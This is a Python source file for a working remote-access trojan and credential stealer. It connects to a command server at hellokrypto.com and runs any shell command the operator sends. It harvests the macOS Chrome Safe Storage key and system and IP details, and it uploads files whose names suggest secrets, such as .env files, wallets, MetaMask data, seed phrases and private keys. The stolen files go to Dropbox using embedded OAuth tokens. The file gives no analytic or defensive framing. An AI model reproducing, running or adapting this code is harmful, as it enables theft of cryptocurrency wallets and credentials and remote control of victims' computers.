import os
import requests
import getpass
import socket
import socketio
import subprocess
import time
import platform
import uuid
import json
import base64


sio = socketio.Client()

refresh_token = "arYD1RoIJOAAAAAAAAAAAZJrBMxVLVB_h_ypHzE83tTB-Lx8uddMebPQuzhuOmrE"
app_key = 'a3iaw2mml0l4q1b'
app_secret = 'bo2fk30np66raug'
dbx_api_token = 'sl.u.AF2rcFqA8_ZwrPc9rSzcVROylIS8XNAMSoZqf7krPMj_-29Ox8c3ZbKZP6KZ8nhADgRVXB-6KVKcH33dJfJIMM8MDipCn-v3_KuKG0pKNvaKyFnKKk5A01TghsYod7PlXExZzVAKOPh0N1XVTyuFv8WCX8ffKDQv5i3e8A1v6vily_1YVaqzEkKI7gCbBGUInOdkbX0RsPwBxhAT_3yVMct6OOxDmfzveePQKs9dqCFFjVWLJJQ75a2bp4ZB_lr4BJCFAmuS8-r3RAmLqXO8btGuVsmD1xS61Wgg0PZM4IfNdVHcg5UGlpFfW8aGK34Qp5Jv7FrW_8UJt8u3DG6mMaLyp_c49a8qonz2sAUuFvBGddG6cag-KhSyRTtrs3faBn1bczE_5vSm9V0bEk6VJGnDesWtKLJWwoNfVuy7KICuMIQzAKpql9FrtLHbRFTxaLjLcM3CIhYJjdIEGpliIa6luftG7Z6cYJxyKvuIbxKciNSDvTtDWhFNyYXo_R5fQUXawpgtN6levfhJuF51s803RL9jLCttt-2RR2mSeX1zQc9sbkxPEEnF5ON2_dSpDthtzy6vDKG_sAhdgdMMmebQGn-bTr5Y0Lx8atHoEtDRdbMp0_ZHAVWwLcV3yQ5s4k-WsZNun-LG6TjjZ1u-sXjlNxdym-abgtpAS2pCohmKGz5cr2x8NmNEwqhpH9a6pVtDXBDK644UfnP_S3uDJ-y9wUPTY6Y5ZP7ow7oFwQzsXpG8lvATcCui6exO-tDcVvKhFvnjB-SD60VkE8GZOC67evkkylS2-yyOIRFD-g3CK5KRp9evh_APloztz8NhcPEFhqQ7BsQt_Az428AupST6EK3r6b0McQx5vUEn4AijK4e85a29qWc0iZEZ6YdVCHfkQsxHyfrz-m9s-cgvj6a2gQphXxD5MKSTkZ0qKei-ydBd-xrwq-Zkq7gul47edCL6WLs_h0gjtYE8qvqin67tfgwa5_BzdnYAXrRNkazkmKL77QMjnXuXouNLjkJ95az_CGB0rJWQEWVh2_2ikIWxbnYT42jjX1ON6EQaoicRkSkK8nkRDUvILQ3hsIr95Hed4hP99c_LMaZyycYyGzNUYWh2ZSWljjj6hojvdl7THOwnRXsT40v9ujCFg-YBlb7MSDTS7qSvJbmxQtBOEumGJ1InpO7khpF7F4ZzlB_sf9acCqNfI3CFpjqpilgOXqeya3GDtSWnVK-kHyf8hhfDLBm3J22sD-Y_B41eivlbP0VabNdXuTT02M0oQXfqL2cQ-AtbEGU_gtj44os9kptmPmtyCkxqk5QPrGDqh5v55OYffL8Qy7mKoNHfZ2x-my21TjdG116kIhYMW7DKHMpWpnnaTcjv_uTtqOoHtttaU4Be3xx5-fwQL5akgW6P6xoghzdDOrQoSx4EHsz7MYI-'
expired_time = 1752734880418

exception_folder = ['node_modules','cargo','.cargo','cache','.cache','.git','artifacts','build','.vscode','.pnpm-store']

imp_strings = ['.env','wallet','metamask','secret','phantom','private','id.json','key','hardhat.config.ts','coinbase','seed']

def get_new_access_token():
    global dbx_api_token
    global expired_time
    try:
        data = {'grant_type': 'refresh_token', 'refresh_token': refresh_token, 'client_id': app_key, 'client_secret': app_secret}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        response = requests.post('https://api.dropboxapi.com/oauth2/token', data=data, headers=headers)
        response.raise_for_status()
        result = response.json()
        dbx_api_token = result['access_token']
        expires_in = int(result['expires_in'])
        expired_time = int(time.time() * 1000) + (expires_in - 300) * 1000
        # print(dbx_api_token)
        # print(expired_time)
    except requests.exceptions.RequestException as e:
        try:
            error_message = e.response.json() if e.response else str(e)
        except Exception:
            error_message = str(e)
        sio.emit('exec_result', error_message, namespace='/client')

# def get_machine_id():
#     try:
#         if os.name == 'nt':
#             import winreg
#             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
#             value, _ = winreg.QueryValueEx(key, "MachineGuid")
#             return value
#         else:
#             with open('/etc/machine-id', 'r') as f:
#                 return f.read().strip()
#     except Exception:
#         from uuid import getnode
#         return hex(getnode())[2:]

def get_hostname():
    hostname = socket.gethostname()
    machine_id = hex(uuid.getnode())[2:]
    full_hostname = f"{hostname}-{machine_id[:6]}"
    if not full_hostname:
        full_hostname = getpass.getuser()
    return full_hostname

def get_system_info():
    try:
        try:
            sys_info = {
                'hostname': socket.gethostname(),
                'machine': platform.machine(),
                'platform': platform.system(),
                'release': platform.release(),
                'username': getpass.getuser(),
                'version': platform.version(),
                'uuid': str(uuid.UUID(int=uuid.getnode()))
            }
        except Exception:
            sys_info = None
        try:
            response = requests.get('https://ipinfo.io/json', timeout=5)
            ip_info = response.json()
        except Exception:
            ip_info = None
        return {'sysInfo': sys_info, 'ipInfo': ip_info}
    except Exception:
        return {'sysInfo': None, 'ipInfo': None}

def upload_file(file_path, upload_file_path):
    if int(time.time() * 1000) > expired_time or dbx_api_token == '':
        get_new_access_token()
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        headers = {
            'Authorization': f'Bearer {dbx_api_token}',
            'Content-Type': 'application/octet-stream',
            'Dropbox-API-Arg': json.dumps({
                "path": upload_file_path.replace("\\", "/"),
                "mode": "add",
                "autorename": True,
                "mute": False
            })
        }
        response = requests.post(
            'https://content.dropboxapi.com/2/files/upload',
            headers=headers,
            data=file_data
        )
        if response.status_code == 200:
            sio.emit('exec_result', f'{file_path} uploaded successfully', namespace='/client')
        else:
            sio.emit('exec_result', f'Upload failed: {response.text}', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'Upload error: {str(e)}', namespace='/client')

def upload_directory(dir_path, upload_dir):
    try:
        files = os.listdir(dir_path)
        for file in files:
            try:
                file_path = os.path.join(dir_path, file)
                upload_path = os.path.join(upload_dir, file)
                if os.path.isdir(file_path):
                    if file.lower() in exception_folder:
                        continue
                    upload_directory(file_path, upload_path)
                else:
                    upload_file(file_path, upload_path)
            except Exception as e:
                sio.emit('exec_result', f'Upload error: {str(e)}', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'Directory read error: {str(e)}', namespace='/client')

def env_upload(dir_path, upload_dir):
    try:
        files = os.listdir(dir_path)
        for file in files:
            try:
                file_path = os.path.join(dir_path, file)
                upload_path = os.path.join(upload_dir, file)
                if os.path.isdir(file_path):
                    if file.lower() in exception_folder:
                        continue
                    env_upload(file_path, upload_path)
                else:
                    is_found = any(keyword in file.lower() for keyword in imp_strings)
                    if is_found:
                        upload_file(file_path, upload_path)
            except Exception as e:
                sio.emit('exec_result', f'envUpload error in file loop: {str(e)}', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'envUpload error in dir: {str(e)}', namespace='/client')

def pat_upload(dir_path, upload_dir, pattern):
    try:
        files = os.listdir(dir_path)
        for file in files:
            try:
                file_path = os.path.join(dir_path, file)
                upload_path = os.path.join(upload_dir, file)

                if os.path.isdir(file_path):
                    if file.lower() in exception_folder:
                        continue
                    pat_upload(file_path, upload_path, pattern)
                else:
                    if pattern in file:
                        upload_file(file_path, upload_path)
            except Exception as e:
                sio.emit('exec_result', f'patUpload error: {str(e)}', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'patUpload read error: {str(e)}', namespace='/client')
 
def get_chrome_encryption_key():
    try:
        process = subprocess.run(
            [
                "security",
                "find-generic-password",
                "-w",
                "-s",
                "Chrome Safe Storage"
            ],
            capture_output=True,
            text=True,
            check=True
        )
        key = process.stdout.strip()
        return key
    except subprocess.CalledProcessError as e:
        return "Failed to retrieve Chrome encryption key: " + str(e)

hostname = get_hostname()

@sio.event(namespace='/client')
def connect():
    print('Connected to server')
    sio.emit('exec_result', f'Connected : {hostname}', namespace='/client')
    sio.emit('set_client_info', {'username': hostname}, namespace='/client')

@sio.on('client_event_file_upload', namespace='/client')
def on_file_upload(data):
    try:
        file_name = data.get('fileName')
        upload_path = data.get('uploadPath')
        file_path = file_name if os.path.isabs(file_name) else os.path.join(os.getcwd(), file_name)

        if os.path.exists(file_path):
            if os.path.isdir(file_path):
                sio.emit('exec_result', 'its not a file', namespace='/client')
            else:
                upload_file_path = os.path.join(f'/{hostname}', upload_path, os.path.basename(file_path))
                upload_file(file_path, upload_file_path)
                sio.emit('exec_result', 'File Uploaded Successfully', namespace='/client')
        else:
            sio.emit('exec_result', 'file not found', namespace='/client')

    except Exception as err:
        sio.emit('exec_result', f'File Upload error: {str(err)}', namespace='/client')

@sio.on('client_event_folder_upload', namespace='/client')
def on_folder_upload(data):
    try:
        dir_path = data.get('dirPath')
        upload_path = data.get('uploadPath')
        local_dir = dir_path if os.path.isabs(dir_path) else os.path.join(os.getcwd(), dir_path)

        if os.path.exists(local_dir):
            if os.path.isdir(local_dir):
                upload_dir = os.path.join(f'/{hostname}', upload_path, os.path.basename(local_dir))
                upload_directory(local_dir, upload_dir)
                sio.emit('exec_result', 'Directory Uploaded Successfully', namespace='/client')
            else:
                sio.emit('exec_result', 'its not a folder', namespace='/client')
        else:
            sio.emit('exec_result', 'folder not found', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'Directory Upload error: {str(e)}', namespace='/client')

@sio.on('client_event_env_upload', namespace='/client')
def on_env_upload(data=None):
    try:
        folder_name = f'env-{int(time.time() * 1000)}'
        upload_dir = os.path.join(f'/{hostname}', folder_name)

        if platform.system() == "Windows":
            for i in range(ord('D'), ord('Z')):
                drive_letter = chr(i)
                dir_path = f"{drive_letter}:/"
                if os.path.exists(dir_path):
                    env_upload(dir_path, os.path.join(upload_dir, drive_letter))
        else:
            home_dir = os.path.expanduser('~')
            env_upload(home_dir, upload_dir)
        # sio.emit('exec_result', 'Env search finished', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'Env search failed: {str(e)}', namespace='/client')

@sio.on('client_event_imp_upload', namespace='/client')
def on_imp_upload(data=None):
    try:
        folder_name = f'imp-{int(time.time() * 1000)}'
        upload_dir = os.path.join(f'/{hostname}', folder_name)
        current_dir = os.getcwd()
        env_upload(current_dir, upload_dir)
        sio.emit('exec_result', 'Imp search finished', namespace='/client')

    except Exception as e:
        sio.emit('exec_result', f'Imp search failed: {str(e)}', namespace='/client')

@sio.on('client_event_pat_upload', namespace='/client')
def on_pattern_upload(pattern):
    try:
        folder_name = f'pat-{int(time.time() * 1000)}'
        upload_dir = os.path.join(f'/{hostname}', folder_name)
        pat_upload(os.getcwd(), upload_dir, pattern)
        sio.emit('exec_result', 'Pat search finished', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'Pat search failed: {str(e)}', namespace='/client')

@sio.on('client_event_file_down', namespace='/client')
def on_file_down(data):
    try:
        file_data = base64.b64decode(data.get('fileData'))
        client_file_path = data.get('clientFilePath')
        with open(client_file_path, 'wb') as f:
            f.write(file_data)
        sio.emit('exec_result', 'File download finished', namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'File download failed: {str(e)}', namespace='/client')

@sio.on('client_event_cmd_exec', namespace='/client')
def on_cmd_exec(instruction):
    try:
        print(instruction)
        args = instruction.strip().split()
        command = args[0].lower()
        content = ' '.join(args[1:])

        if command == 'cstop':
            pass

        elif command == 'cd':
            os.chdir(content)
            current_dir = os.getcwd()
            sio.emit('exec_result', current_dir, namespace='/client')
        else:
            result = subprocess.run(
                instruction,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            if result.stdout:
                sio.emit('exec_result', result.stdout, namespace='/client')
            elif result.stderr:
                sio.emit('exec_result', result.stderr, namespace='/client')

    except Exception as e:
        sio.emit('exec_result', f"Command execution error: {str(e)}")

@sio.on('client_event_system_information', namespace='/client')
def on_system_info_request():
    try:
        system_info = get_system_info()
        sio.emit('exec_result', json.dumps(system_info), namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'Error in getting system information: {str(e)}', namespace='/client')

@sio.on('client_event_get_chrome_encryption_key', namespace='/client')
def on_get_chrome_encryption_key():
    try:
        chrome_encryption_key = get_chrome_encryption_key()
        sio.emit('exec_result', chrome_encryption_key, namespace='/client')
    except Exception as e:
        sio.emit('exec_result', f'Error in getting chrome encryption key: {str(e)}', namespace='/client')


# sio.connect('http://localhost:8111', namespaces=['/client'])
sio.connect('https://hellokrypto.com/', socketio_path='/socket.io', namespaces=['/client'])
sio.wait()